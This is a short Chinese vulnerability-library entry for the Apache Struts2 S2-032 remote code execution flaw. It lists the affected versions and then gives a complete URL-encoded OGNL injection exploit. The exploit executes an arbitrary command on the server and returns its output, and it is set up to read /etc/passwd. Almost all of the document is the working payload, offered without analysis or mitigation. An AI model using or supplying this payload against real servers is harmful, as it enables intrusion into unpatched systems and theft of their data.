---
title: 'Struts2 S2-032远程代码执行'
date: Mon, 24 Aug 2020 13:20:51 +0000
draft: false
tags: ['RCE', 'struts2', '白阁-漏洞库', '远程命令执行']
---

### 影响范围

Struts 2.3.20 - Struts Struts 2.3.28（2.3.20.3和2.3.24.3除外）

### EXP

```
?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=cat /etc/passwd
```



![](Struts2%20S2-032%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/%E5%BE%AE%E4%BF%A1%E6%88%AA%E5%9B%BE_20200824211724.png)